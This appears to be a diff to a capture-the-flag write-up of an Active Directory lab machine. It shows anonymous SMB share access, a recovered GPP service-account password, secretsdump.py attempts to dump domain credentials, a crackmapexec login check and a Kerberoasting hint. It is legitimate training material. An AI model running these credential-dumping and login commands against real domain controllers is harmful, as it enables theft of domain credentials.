@@ -141,7 +141,7 @@ Failed to connect with SMB1 -- no workgroup available
 After trying to connect to the different shares, Replication is the only one with anonymous login
 
 ```
-~/Documents/code/scratch$ sudo smbclient \\\\10.10.10.100\\Replication\\
+> sudo smbclient \\\\10.10.10.100\\Replication\\
 Enter WORKGROUP\root's password: 
 Anonymous login successful
 Try "help" to get a list of possible commands.
@@ -203,7 +203,7 @@ password=> "GPPstillStandingStrong2k18"
 
 Tried and failed with the following... 
 ```
-nostromo :: ~ » sudo secretsdump.py active\SVC_TGS:'GPPstillStandingStrong2k18'@10.10.10.100
+» sudo secretsdump.py active\SVC_TGS:'GPPstillStandingStrong2k18'@10.10.10.100
 Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
 
 [-] RemoteOperations failed: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
@@ -218,7 +218,8 @@ Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
 [-] share 'Replication' is not writable.
 [-] share 'SYSVOL' is not writable.
 [-] share 'Users' is not writable.
-nostromo :: ~ » sudo secretsdump.py active/SVC_TGS:'GPPstillStandingStrong2k18'@10.10.10.100
+
+» sudo secretsdump.py active/SVC_TGS:'GPPstillStandingStrong2k18'@10.10.10.100
 Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
 
 [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
@@ -227,19 +228,24 @@ Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
 [-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
 [*] Something wen't wrong with the DRSUAPI approach. Try again with -use-vss parameter
 [*] Cleaning up... 
-nostromo :: ~ » sudo secretsdump.py active/SVC_TGS:'GPPstillStandingStrong2k18'@10.10.10.100 -use-vss
+
+» sudo secretsdump.py active/SVC_TGS:'GPPstillStandingStrong2k18'@10.10.10.100 -use-vss
 Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
 
 [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
 [*] Searching for NTDS.dit
 [-] 'NoneType' object has no attribute 'request'
 [*] Cleaning up... 
-nostromo :: ~ » sudo crackmapexec smb 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k1
+
+» sudo crackmapexec smb 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k1
 /Library/Python/2.7/site-packages/beautifulsoup4-4.8.2-py2.7.egg/bs4/element.py:16: UserWarning: The soupsieve package is not installed. CSS selectors cannot be used.
   'The soupsieve package is not installed. CSS selectors cannot be used.'
 SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:ACTIVE) (signing:True) (SMBv1:False)
 SMB         10.10.10.100    445    DC               [-] ACTIVE\SVC_TGS:GPPstillStandingStrong2k1 STATUS_LOGON_FAILURE 
 ```
+
+#### 2. Privilige Escalation
+
 Hint is in the name 'SVC_TGS'. Kerberos roasting attack...
 
 ```
